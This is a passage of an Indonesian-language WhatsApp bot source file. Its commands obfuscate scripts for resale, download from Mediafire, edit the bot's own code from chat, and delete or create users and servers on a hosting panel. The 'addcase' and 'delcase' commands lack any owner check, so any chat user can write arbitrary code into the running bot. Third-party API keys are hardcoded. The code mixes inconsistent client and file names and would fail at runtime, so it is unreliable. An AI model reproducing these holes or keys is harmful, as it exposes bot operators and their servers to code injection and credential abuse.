        fileName: 'obfuscated_code.js', // Nama file yang akan dikirim
        mimetype: 'application/javascript' // MIME type untuk JavaScript
    }, { quoted: m, caption: 'Suksess' });

    break;
case 'mediafire':{
    if (!isOwner) return reply(mess.only.premium)
 async function mediafiredll(url) {
 try {
 // Mengubah URL agar dapat diterjemahkan melalui layanan proxy
 const res = await axios.get(`https://www-mediafire-com.translate.goog/${url.replace('https://www.mediafire.com/', '')}?_x_tr_sl=en&_x_tr_tl=fr&_x_tr_hl=en&_x_tr_pto=wapp`);
 const $ = cheerio.load(res.data);
 
 // Mengambil data file dari halaman Mediafire
 const fileurl = $('#downloadButton').attr('href');
 const filename = $('body > main > div.content > div.center > div > div.dl-btn-cont > div.dl-btn-labelWrap > div.promoDownloadName.notranslate > div')
 .attr('title')
 .replace(/\s+/g, '') // Menghapus semua spasi dan newline
 .trim(); // Membersihkan spasi ekstra

 const date = $('body > main > div.content > div.center > div > div.dl-info > ul > li:nth-child(2) > span').text().trim();
 const filesize = $('#downloadButton').text()
 .replace('Download', '')
 .replace(/[()]/g, '') // Menghapus tanda kurung
 .replace(/\s+/g, '') // Menghapus spasi berlebih
 .trim(); 

 // Mendapatkan tipe file dari header HTTP
 const rese = await axios.head(fileurl);
 const filetype = rese.headers['content-type'];

 return { filename, filesize, date, filetype, fileurl };
 } catch (err) {
 console.error('Error fetching Mediafire details:', err);
 throw new Error('Gagal mendapatkan detail file dari Mediafire.');
 }
 }

 // Cek apakah input URL diberikan
 let inputExample = `*Contoh*: ${prefix + command} https://www.mediafire.com/file/xxxxxxx`;
 if (!text) return m.reply(inputExample);

 try {
 // Ambil detail file
 const dataJson = await mediafiredll(text);
 const { filename, filesize, date, filetype, fileurl } = dataJson;

 // Memastikan ukuran file tidak melebihi batas 100 MB
 if (parseFloat(filesize.split('MB')[0]) >= 100) {
 return m.reply('*File terlalu besar! Maksimal ukuran adalah 100 MB.*');
 }

 await sleep(500); // Menunggu sejenak untuk pengalaman pengguna yang lebih baik

 // Format pesan informasi file
 const caption = `≡ *MEDIAFIRE*

▢ *Nama* : ${filename}
▢ *Ukuran* : ${filesize}
▢ *Tipe* : ${filetype}
▢ *Diunggah* : ${date}`;

 // Kirim file sebagai dokumen ke pengguna
 await dhikaXs.sendMessage(
 m.chat, 
 { 
 document: { url: fileurl }, 
 fileName: filename, 
 caption: caption, 
 mimetype: filetype 
 }, 
 { quoted: m }
 );
 } catch (err) {
 m.reply(`Terjadi kesalahan: ${err.message}`);
 }
}
break;

case 'renamecase':
    if (!isOwner) return reply(mess.only.premium)

    // Pisahkan input menjadi nama case lama dan nama case baru
    const [oldCaseName, newCaseName] = q.split('|').map(name => name.trim());

    if (!oldCaseName || !newCaseName) {
        return m.reply('Format tidak valid. Contoh: renamecase izintes|izintesnew');
    }

    // Path ke file yang berisi switch-case
    const rinembos = path.join(__dirname, 'killuaXs.js');

    try {
        // Baca file secara sinkron
        let data = fs.readFileSync(rinembos, 'utf8');

        // Ekspresi reguler untuk mencari case berdasarkan nama lama
        const caseRegex = new RegExp(`case\\s+'${oldCaseName}'\\s*:\\s*`, 'g');
        const startIndex = data.search(caseRegex);

        if (startIndex === -1) {  // Perbaikan dari - menjadi -1
            return m.reply(`Case '${oldCaseName}' tidak ditemukan.`);
        }

        // Cari case berikutnya setelah case yang dicari
        const nextCasePattern = /case\s+/g;  // Perbaikan ekspresi reguler
        nextCasePattern.lastIndex = startIndex + 1;
        const nextCaseMatch = nextCasePattern.exec(data);

        // Update nama case
        const updatedData = data.replace(caseRegex, `case '${newCaseName}':`);
        
        // Tulis kembali ke file
        fs.writeFileSync(rinembos, updatedData, 'utf8');
        m.reply(`Case '${oldCaseName}' sukses menjadi '${newCaseName}'!`);
    } catch (err) {
        console.error(err);
        m.reply('Terjadi kesalahan saat membaca atau menulis file.');
    }
    break;
    case 'editcase':
    if (!q) return m.reply('Mana case yang ingin diedit? Format: .editcase case \'namafitur\':\n\n<kode baru>');
    if (!isCreator) return m.reply('Khusus owner');

    const caseNameRegex = /case\s+'([^']+)':/; 
    const match = q.match(caseNameRegex);

    if (!match) {
        return m.reply('Format tidak benar. Contoh: .editcase case \'namafitur\':\n\n<kode baru>');
    }

    const caseName = match[1]; 
    const newCode = q.replace(caseNameRegex, '').trim(); 

   
    const filenyabang = path.join(__dirname, 'killuaXs.js');

    try {
        
        let data = fs.readFileSync(filenyabang, 'utf8');
        const caseRegex = new RegExp(`case\\s+'${caseName}'\\s*:\\s*`, 'g');
        const startIndex = data.search(caseRegex);

        if (startIndex !== -1) {
            let endIndex = -1;
            const breakPattern = /break\s*;/g;
            breakPattern.lastIndex = startIndex;
            const breakMatch = breakPattern.exec(data);

            if (breakMatch) {
                endIndex = breakMatch.index + breakMatch[0].length;
            }

           
            const nextCasePattern = /case\s+'/g;
            nextCasePattern.lastIndex = startIndex + 1;
            const nextCaseMatch = nextCasePattern.exec(data);

            if (nextCaseMatch && (endIndex === -1 || nextCaseMatch.index < endIndex)) {
                endIndex = nextCaseMatch.index;
            }

            if (endIndex !== -1) {
                const updatedCode = `case '${caseName}':\n${newCode}\n`;
                data = data.slice(0, startIndex) + updatedCode + data.slice(endIndex);
                fs.writeFileSync(filenyabang, data, 'utf8');
                m.reply(`Succesfully update case ${q}!`);
            } else {
                m.reply('Maaf, tidak ditemukan akhir yang jelas untuk case tersebut.');
            }
        } else {
            m.reply('Sorry, case nya gada di file killuaXs.js');
        }
    } catch (err) {
        console.error(err);
        m.reply('Eror, silahkan cek console untuk lihat apa yang eror');
    }
    break;
    case 'getfunc':
    if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
    
    const AanzZcoder = path.join(__dirname, 'killua.js');
    
    try {
        const data = fs.readFileSync(AanzZcoder, 'utf8');
        
        if (!q) {
           
            const funcRegex = /async function (\w+)\s*\([^)]*\)\s*{/g;
            let functionsList = [];
            let match;

            
            while ((match = funcRegex.exec(data)) !== null) {
                functionsList.push(match[1]); 
            }

            if (functionsList.length > 0) {

                m.reply(`Mau cari function apa?\n\n${functionsList.map((func, index) => `${index + 1}. ${func}`).join('\n')}`);
            } else {
                m.reply('Tidak ada async function yang ditemukan.');
            }
            return; 
        }

        
        const funcRegex = new RegExp(`async function ${q}\\s*\\([^)]*\\)\\s*{`, 'g');
        const startIndex = data.search(funcRegex);
        
        if (startIndex !== -1) {
            let openBrackets = 0;
            let endIndex = startIndex;
            for (let i = startIndex; i < data.length; i++) {
                if (data[i] === '{') {
                    openBrackets++;
                } else if (data[i] === '}') {
                    openBrackets--;
                    if (openBrackets === 0) {
                        endIndex = i;
                        break;
                    }
                }
            }
            
            const extrakbang = data.slice(startIndex, endIndex + 1);
            m.reply(`*YOUR FUNCTION*:\n\n${extrakbang}`);
        } else {
            m.reply('Nama func nya gada bro, coba cari lain');
        }
    } catch (err) {
        console.error(err);
        m.reply('Error! cek console mu.');
    }
    break;
case 'addcase': {
if (!text) return m.reply(`Contoh: ${prefix+command} case nya`);
const namaFile = path.join(__dirname, 'killuaXs.js');
const caseBaru = `${text}\n\n`;
const tambahCase = (data, caseBaru) => {
const posisiDefault = data.lastIndexOf("default:");
if (posisiDefault !== -1) {
const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
return { success: true, kodeBaruLengkap };
} else {
return { success: false, message: "Tidak dapat menemukan case default di dalam file!" };
}};
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return m.reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
}
const result = tambahCase(data, caseBaru);
if (result.success) {
fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
if (err) {
console.error('Terjadi kesalahan saat menulis file:', err);
return m.reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
} else {
console.log('Sukses menambahkan case baru:');
console.log(caseBaru);
return m.reply('Sukses menambahkan case!');
}});
} else {
console.error(result.message);
return m.reply(result.message);
}});
}
break            
case 'delcase': {
if (!text) return m.reply(`Contoh: ${prefix+command} nama case`);
const fs = require('fs').promises;
async function dellCase(filePath, caseNameToRemove) {
try {
let data = await fs.readFile(filePath, 'utf8');
const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
const modifiedData = data.replace(regex, '');
if (data === modifiedData) {
m.reply('Case tidak ditemukan atau sudah dihapus.');
return;
}
await fs.writeFile(filePath, modifiedData, 'utf8');
m.reply('Sukses menghapus case!');
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}}
dellCase('./killuaXs.js', q);
break;
}
        
        case 'getcase':
    if (!q) return m.reply('Mana nama case yang ingin diambil?');
   if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
    // Path ke file yang berisi switch-case
    const filePath = path.join(__dirname, 'killuaXs.js');
    
    try {
        // Baca file secara sinkron
        const data = fs.readFileSync(filePath, 'utf8');
        
        // Ekspresi reguler untuk mencari case berdasarkan nama
        const caseRegex = new RegExp(`case\\s+'${q}'\\s*:\\s*`, 'g');
        const startIndex = data.search(caseRegex);
        
        if (startIndex !== -1) {
            let endIndex = -1;
            const breakPattern = /break\s*;/g;
            breakPattern.lastIndex = startIndex;
            const breakMatch = breakPattern.exec(data);
            
            if (breakMatch) {
                endIndex = breakMatch.index + breakMatch[0].length;
            }
            
            // Cari case berikutnya setelah case yang dicari
            const nextCasePattern = /case\s+'/g;
            nextCasePattern.lastIndex = startIndex + 1;
            const nextCaseMatch = nextCasePattern.exec(data);
            
            if (nextCaseMatch && (endIndex === -1 || nextCaseMatch.index < endIndex)) {
                endIndex = nextCaseMatch.index;
            }
            
            if (endIndex !== -1) {
                // Ekstrak isi case
                const caseCode = data.slice(startIndex, endIndex);
                m.reply(`Nih case:\n\n${caseCode}`);
            } else {
                // Jika tidak ditemukan batas akhir
                m.reply('Maaf, tidak ditemukan akhir yang jelas untuk case tersebut.');
            }
        } else {
            // Jika case tidak ditemukan, kirimkan pesan
            m.reply('Maaf, case tidak ada dalam file dhikaXs.js');
        }
    } catch (err) {
        console.error(err);
        m.reply('Terjadi kesalahan saat membaca file.');
    }
    break;

case 'encryptv2':
    if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
    if (!text) return m.reply('Mana textnya');
    // Proses deobfuscation
    const kkkkk = await EncryptJs2(text);

    // Pastikan hasilDeobfuscate adalah string dan hapus tanda kutip di awal dan akhir
    const cleanResulti = kkkkk.replace(/^"|"$/g, ''); // Menghapus tanda kutip di awal dan akhir

    // Tambahkan watermark di awal hasil
    const watermarkk = `/*\n * Obfuscated By AanzzzCuyxzz\n * Buy Script Pv me\n\n*/\n\n`;
    const utm = watermarkk + cleanResulti; // Gabungkan watermark dengan hasil asli

    // Mengirim hasil sebagai file JavaScript
    await dhikaXs.sendMessage(m.chat, { 
        document: Buffer.from(utm, 'utf-8'), 
        fileName: 'obfuscated_code.js', // Nama file yang akan dikirim
        mimetype: 'application/javascript' // MIME type untuk JavaScript
    }, { quoted: m, caption: 'Suksess' });

    break;
case 'upcapikey':{
    if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text; // Dapatkan teks dari pesan yang dibalas atau input

 // Update global capikey dengan nilai baru
 global.capikey = newteks;

 // Kirim balasan bahwa capikey telah berhasil diganti
 await dhikaXs.sendMessage(m.chat, { text: "_Berhasil Mengganti Capikey Panel✅_" }, { quoted: m });
 } else {
 // Jika format salah, kirimkan pesan contoh format yang benar
 await dhikaXs.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Capikey>` }, { quoted: m });
 }
}
break;
case 'deladmin':{
    if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 if (!args[0]) return m.reply(`Untuk melihat ID silahkan ketik ${prefix}listadmin`);
 
 let cek = await fetch(domain + "/api/application/users?page=1", {
 "method": "GET",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey
 }
 });

 let res2 = await cek.json();
 let users = res2.data;
 let getid = null;
 let idadmin = null;

 // Loop users untuk cari admin yang sesuai dengan ID
 for (let e of users) {
 if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
 getid = e.attributes.username;
 idadmin = e.attributes.id;

 try {
 let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
 "method": "DELETE",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey
 }
 });

 // Cek apakah penghapusan admin berhasil
 if (!delusr.ok) {
 throw new Error('Gagal menghapus admin!');
 }

 m.reply(`Berhasil menghapus admin panel *${getid}*`);
 } catch (err) {
 console.error(err);
 m.reply(`❌ Terjadi kesalahan saat mencoba menghapus admin: ${err.message}`);
 }
 break; // Keluar dari loop setelah berhasil
 }
 }

 // Jika admin tidak ditemukan
 if (idadmin == null) {
 m.reply("ID admin tidak ditemukan atau admin tidak valid!");
 }
}
break

case 'delserver':{
    if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 let srv = args[0]; // ID server yang ingin dihapus
 if (!srv) return m.reply('ID servernya mana?');

 try {
 let f = await fetch(domain + "/api/application/servers/" + srv, {
 "method": "DELETE",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey,
 }
 });

 // Cek respons
 if (f.ok) {
 m.reply('✅ Sukses menghapus server!');
 } else {
 let res = await f.json();
 let errorMessage = res.errors?.[0]?.detail || 'Server tidak ditemukan!';
 m.reply(`❌ Gagal menghapus server: ${errorMessage}`);
 }
 } catch (e) {
 console.error(e);
 m.reply('❌ Terjadi kesalahan saat menghapus server.');
 }
}
break

case 'deluser':{
  if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 let usr = args[0]; // ID user yang ingin dihapus
 if (!usr) return m.reply('ID usernya mana?');

 try {
 let f = await fetch(domain + "/api/application/users/" + usr, {
 "method": "DELETE",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey,
 }
 });

 // Cek respons
 if (f.ok) {
 m.reply('✅ Sukses menghapus user!');
 } else {
 let res = await f.json();
 let errorMessage = res.errors?.[0]?.detail || 'User tidak ditemukan!';
 m.reply(`❌ Gagal menghapus user: ${errorMessage}`);
 }
 } catch (e) {
 console.error(e);
 m.reply('❌ Terjadi kesalahan saat menghapus user.');
 }
}
break

case 'listadmin':
{
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 let page = args[0] ? args[0] : '1';
 let f = await fetch(domain + "/api/application/users?page=" + page, {
 "method": "GET",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey
 }
 });

 let res = await f.json();
 let users = res.data;
 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4';

 let teks = `╭─❒ *List Admin Server*\n`;

 for (let user of users) {
 let u = user.attributes;
 if (u.root_admin) { // Cek apakah user adalah admin
 teks += `├ ID : ${u.id}\n`;
 teks += `├ Username : ${u.username}\n`;
 teks += `├ Nama Depan : ${u.first_name}\n`;
 teks += `├ Nama Belakang : ${u.last_name}\n`;
 teks += `├ Status : ${u.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
 teks += `├───────────────\n`;
 }
 }

 teks += `╰─❒ Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 teks += ` Total Admin: ${res.meta.pagination.count}\n`;

 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 teks += `\n➜ Ketik: *${prefix + command} ${res.meta.pagination.current_page + 1}* untuk melihat halaman berikutnya.`;
 }

 await dhikaXs.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: 'Dhika Official market | secure 〽️',
 body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });
}
break;




case 'listuser':{
    if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 let page = args[0] ? args[0] : '1';

 let f = await fetch(domain + "/api/application/users?page=" + page, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey
 }
 });

 let res = await f.json();
 if (res.errors) return m.reply(`Gagal mengambil data user: ${JSON.stringify(res.errors[0], null, 2)}`);
 
 let users = res.data;
 if (!users || users.length === 0) return m.reply("Tidak ada user yang ditemukan.");

 let messageText = "Berikut list usernya:\n\n";
 for (let user of users) {
 let u = user.attributes;
 messageText += `ID: ${u.id} - Status: ${u.server_limit === null ? 'Tidak aktif' : 'Aktif'}\n`;
 messageText += `Username: ${u.username}\n`;
 messageText += `Nama: ${u.first_name} ${u.last_name}\n\n`;
 }

 messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 messageText += `Total user: ${res.meta.pagination.total}`;
 await dhikaXs.sendMessage(m.chat, { text: messageText }, { quoted: m });

 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 m.reply(`Gunakan perintah *${prefix + command} ${parseInt(res.meta.pagination.current_page) + 1}* untuk melihat halaman selanjutnya.`);
 }
}
break

case 'listserver':
{
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)

 let page = parseInt(args[0]) || 1; // Default ke halaman 1 jika tidak ada input

 try {
 let f = await fetch(domain + `/api/application/servers?page=${page}`, {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": `Bearer ${apikey}`
 }
 });

 let res = await f.json();

 // Cek jika ada error dari API
 if (res.errors) {
 return m.reply(`❌ Gagal mengambil data server:\n${JSON.stringify(res.errors[0], null, 2)}`);
 }

 let servers = res.data;

 // Cek jika tidak ada server ditemukan
 if (!servers || servers.length === 0) {
 return m.reply("❌ Tidak ada server yang ditemukan.");
 }

 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // URL video atau GIF

 let teks = `╭─❒ *List Server*\n`;

 for (let server of servers) {
 let s = server.attributes;
 teks += `├ *ID Server*: ${s.id}\n`;
 teks += `├ *Nama*: ${s.name}\n`;
 teks += `├ *Deskripsi*: ${s.description}\n`;
 teks += `├ *Status*: ${s.suspended ? 'Suspend' : 'Aktif'}\n`;
 teks += `├───────────────\n`;
 }

 teks += `╰─❒ *Halaman*: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 teks += ` *Total Server*: ${res.meta.pagination.total}\n`;

 // Navigasi halaman
 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 teks += `\n➜ Ketik: *${prefix + command} ${res.meta.pagination.current_page + 1}* untuk halaman berikutnya.`;
 }

 // Kirim pesan
 await KilluaXs.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: 'Killua Official market | secure 〽️',
 body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });

 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat mengambil data server.");
 }
}
break;

case 'unli':
{
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server
 let memo = "0"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(domain + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });
 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 });
 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(domain + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)],
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });
 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // Ganti dengan URL video

 // Kirim pesan ke target
 let ctf = `┌───「 *AanzCuyxzzz-V2* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${domain}
└───────────────────
> *_© Developer : Killua Official market | secure 〽️*`;

 await dhikaXs.sendMessage(u, {
 video: { url: videoUrl },
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Ganti URL thumbnail jika ada
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;
case 'giphy':
if (args.length < 2) {
 return dhikaXs.sendMessage(m.chat, {text: 'Harap masukkan kata kunci dan rasio untuk mencari GIF. Contoh: .giphy kucing 16:9'});
 }

 const query = args.slice(0, args.length - 1).join(" ");
 const ratio = args[args.length - 1]; 

 const giphyApiKey = 'ERNiZMa3nz2NmHutk8BN36wJ5wRhtOIZ';
 const giphyUrl = `https://api.giphy.com/v1/gifs/search?api_key=${giphyApiKey}&q=${encodeURIComponent(query)}&limit=3`;

 try {
 const res = await fetch(giphyUrl);
 const json = await res.json();

 if (json.data.length > 0) {
 const gifs = json.data.slice(0, 3);

 let sizeOption = 'fixed_width'; 
 if (ratio === '16:9') {
 sizeOption = 'fixed_width';
 } else if (ratio === '1:1') {
 sizeOption = 'fixed_height';
 }

 const gifUrls = gifs.map((gif) => gif.images.original_mp4 ? gif.images.original_mp4.mp4 : gif.images.original.mp4);

 if (gifUrls.length === 3) {
 for (let i = 0; i < gifUrls.length; i++) {
 await killuaXs.sendMessage(m.chat, {
 video: { url: gifUrls[i] },
 caption: `GIF ${i + 1} hasil pencarian untuk: ${query} dengan ukuran: ${ratio}`,
 mimetype: 'video/mp4',
 });
 }
 return;
 } else {
 return killuaXs.sendMessage(m.chat, {text: `Tidak ditemukan tiga GIF untuk: ${query}`});
 }
 } else {
 return KilluaXs.sendMessage(m.chat, {text: `Tidak ditemukan GIF untuk: ${query}`});
 }
 } catch (error) {
 console.error(error);
 return killuaXs.sendMessage(m.chat, {text: 'Terjadi kesalahan saat mengambil GIF dari GIPHY. Harap coba lagi nanti.'});
 }
 break
case 'cuaca':
if (args.length === 0) {
 return killuaXs.sendMessage(m.chat, {
 text: "Harap masukkan nama kota setelah perintah, contoh: `.cuaca Jakarta`",
 });
 }

 const city = args.join(" ");
 const weatherApiKey = 'b4e61a9a74f943babc901855243011'; // Ganti dengan API key Anda
 const weatherUrl = `https://api.weatherapi.com/v1/current.json?key=${weatherApiKey}&q=${city}&lang=id`;

 try {
 const response = await axios.get(weatherUrl);

 // Cek jika ada error dari API
 if (response.data.error) {
 return dhikaXs.sendMessage(m.chat, {
 text: `❌ Terjadi kesalahan: ${response.data.error.message}. Pastikan nama kota sudah benar.`,
 });
 }

 // Ambil data cuaca dari response
 const weatherData = response.data;
 const weatherInfo = `
 *Cuaca di ${weatherData.location.name}, ${weatherData.location.country}*
 🌡️ *Suhu*: ${weatherData.current.temp_c}°C
 ☁️ *Kondisi*: ${weatherData.current.condition.text}
 💨 *Kecepatan Angin*: ${weatherData.current.wind_kph} km/h
 💧 *Kelembapan*: ${weatherData.current.humidity}%
 🌅 *Waktu*: ${weatherData.location.localtime}
 `;

 // Mengirim informasi cuaca
 return killuaXs.sendMessage(m.chat, {
 text: weatherInfo,
 });

 } catch (error) {
 // Tangani kesalahan saat request API
 console.error('Kesalahan:', error);
 return killuaXs.sendMessage(m.chat, {
 text: "❌ Terjadi kesalahan saat mengambil informasi cuaca. Harap coba lagi nanti.",
 });
 }
 break
case 'shortlink':
{
 try {
 const axios = require('axios');
 const url = text.trim();
 if (!url || !url.startsWith('http')) {
 return killuaXs.sendMessage(m.chat, { 
 text: '*🚫 Harap masukkan URL yang valid (contoh: https://example.com).*' 
 }, { quoted: m });
 }

 const response = await axios.get(`https://tinyurl.com/api-create.php?url=${url}`);
 const shortUrl = response.data;

 killuaXs.sendMessage(m.chat, { 
 text: `*🔗 Link Pendek:*\n\n${shortUrl}` 
 }, { quoted: m });
 } catch (error) {
 console.error('Error memperpendek URL:', error);
 killuaXs.sendMessage(m.chat, { 
 text: `*❌ Terjadi kesalahan saat memperpendek URL.*\n\nDetail: ${error.message}` 
 }, { quoted: m });
 }
}
break

case 'sticker':
{
 try {
 if (!m.quoted) {
 return killuaXs.sendMessage(m.chat, { 
 text: '*🚫 Balas pesan gambar/video atau kirim gambar/video untuk dijadikan sticker.*' 
 }, { quoted: m });
 }

 const quotedMsg = m.quoted;
 const mime = quotedMsg.mimetype || '';

 if (!/image|video/.test(mime)) {
 return killuaXs.sendMessage(m.chat, { 
 text: '*🚫 File yang dibalas harus berupa gambar atau video.*' 
 }, { quoted: m });
 }

 const isImage = /image/.test(mime);
 const isVideo = /video/.test(mime);

 // Pastikan video berdurasi pendek (max 10 detik)
 if (isVideo && (quotedMsg.seconds > 10)) {
 return killuaXs.sendMessage(m.chat, { 
 text: '*🚫 Video terlalu panjang. Maksimal 10 detik.*' 
 }, { quoted: m });
 }

 // Unduh media
 const media = await killuaXs.downloadMediaMessage(quotedMsg);
 if (!media) {
 return killuaXs.sendMessage(m.chat, { 
 text: '*❌ Gagal mengunduh media. Harap coba lagi.*' 
 }, { quoted: m });
 }

 // Kirim stiker
 killuaXs.sendMessage(
 m.chat,
 { 
 sticker: media, 
 mimetype: 'image/webp', 
 packname: 'MyBot Sticker', 
 author: 'Dhika Bot' 
 },
 { quoted: m }
 );
 } catch (error) {
 console.error('Error pada case sticker:', error);
 dhikaXs.sendMessage(m.chat, { 
 text: `*❌ Terjadi kesalahan saat membuat sticker.*\n\nDetail: ${error.message}` 
 }, { quoted: m });
 }
}
break

case 'setppbot':{
    if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
 try {
 // Memeriksa apakah pengguna mereply atau mengirim gambar
 const mediaMessage = m.message.imageMessage || (m.quoted && m.quoted.message.imageMessage);
 if (!mediaMessage) {
 return killuaXs.sendMessage(m.chat, { 
 text: '*🚫 Harap reply atau kirimkan sebuah gambar untuk dijadikan foto profil bot.*' 
 }, { quoted: m });
 }

 const mediaBuffer = await killuaXs.downloadMediaMessage(mediaMessage);

 await killuaXs.updateProfilePicture(dhikaXs.user.id, mediaBuffer);

 killuaXs.sendMessage(m.chat, { 
 text: '*✅ Foto profil bot berhasil diubah.*' 
 }, { quoted: m });
 } catch (error) {
 console.error('Error saat mengganti foto profil bot:', error);
 killuaXs.sendMessage(m.chat, { 
 text: `*❌ Terjadi kesalahan saat mengganti foto profil bot.*\n\nDetail: ${error.message}` 
 }, { quoted: m });
 }
}
break

    case 'totalfitur': {
    const totalFitur = () => {
        const mytext = fs.readFileSync("./dhikaXs.js").toString();
        const numUpper = (mytext.match(/case '/g) || []).length;
        return numUpper;
    };

    const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // URL video yang ingin digunakan

    let teks = `
┌───「 *Killua Official market | secure 〽️* 」───
│ ⚙️ *Total Fitur*: ${totalFitur()}
